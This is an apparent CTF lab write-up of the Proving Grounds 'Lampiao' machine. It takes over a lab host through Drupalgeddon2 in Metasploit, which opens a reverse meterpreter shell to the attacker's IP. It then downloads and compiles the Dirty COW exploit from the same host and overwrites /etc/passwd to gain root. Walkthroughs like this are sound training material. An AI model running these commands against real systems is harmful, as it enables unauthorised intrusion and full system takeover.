---
title: "Proving grounds Play: Lampiao"
layout: post
date: 2023-09-27 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
- Drupalgeddon
- Dirtyc0w
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 46b199607d81693cae1fc7ffc366e310 (DSA)
|   2048 f3e888f22dd0b2540b9cad6133595593 (RSA)
|   256 ce632af7536e46e2ae81e3ffb716f452 (ECDSA)
|_  256 c655ca073765e306c1d65b77dc23dfcc (ED25519)
80/tcp   open  http?
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Lampi\xC3\xA3o
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
| http-robots.txt: 36 disallowed entries (15 shown)
```

## Web PORT: 1898

![img](/assets/images/CTF/Proving_Grounds/Lampiao/web.png)

```html
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

http://192.168.172.48:1898/CHANGELOG.txt

The CMS version used in the web page is Drupal 7.54 which is vulnerable to [Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution](https://www.exploit-db.com/exploits/44449).

## Initial Foothold

```sh
msf6 exploit(multi/http/drupal_drupageddon) > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.172.48
rhosts => 192.168.172.48
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rport 1898
rport => 1898
sf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.45.152
lhost => 192.168.45.152
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lport 4444
lport => 4444
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 192.168.45.152:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 192.168.172.48
[*] Meterpreter session 1 opened (192.168.45.152:4444 -> 192.168.172.48:50570) at 2023-09-26 21:56:05 -0400
```

## Privilege Escalation

```sh
ww-data@lampiao:/tmp$ uname -a
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
www-data@lampiao:/tmp$ cat /etc/*release
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.5 LTS"
NAME="Ubuntu"
VERSION="14.04.5 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.5 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

The machine is vulnerable to [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839).

```sh
ww-data@lampiao:/tmp$ wget http://192.168.45.152:80/dirty.c -O dirty.c #download exploit to attacking machine
wget http://192.168.45.152:80/dirty.c -O dirty.c
--2023-09-26 23:07:15--  http://192.168.45.152/dirty.c
Connecting to 192.168.45.152:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/x-csrc]
Saving to: 'dirty.c'

100%[======================================>] 5,006       --.-K/s   in 0.02s   

2023-09-26 23:07:15 (236 KB/s) - 'dirty.c' saved [5006/5006]

www-data@lampiao:/tmp$ ls
ls
dirty.c  suid3num.py  vmware-root
www-data@lampiao:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt #compile the exploit
gcc -pthread dirty.c -o dirty -lcrypt
www-data@lampiao:/tmp$ ls
ls
dirty  dirty.c	suid3num.py  vmware-root
www-data@lampiao:/tmp$ ./dirty #run the exploit
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password #set new password

Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash
```

Now use switch user or SSH to login to user `firefart:password` to obtain root.

```sh
naveenj@hackerspace:|22:15|~/pg-play/Lampiao/files$ ssh firefart@192.168.172.48
firefart@192.168.172.48's password: password

Last login: Wed Jul 22 14:23:39 2020
firefart@lampiao:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@lampiao:~# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).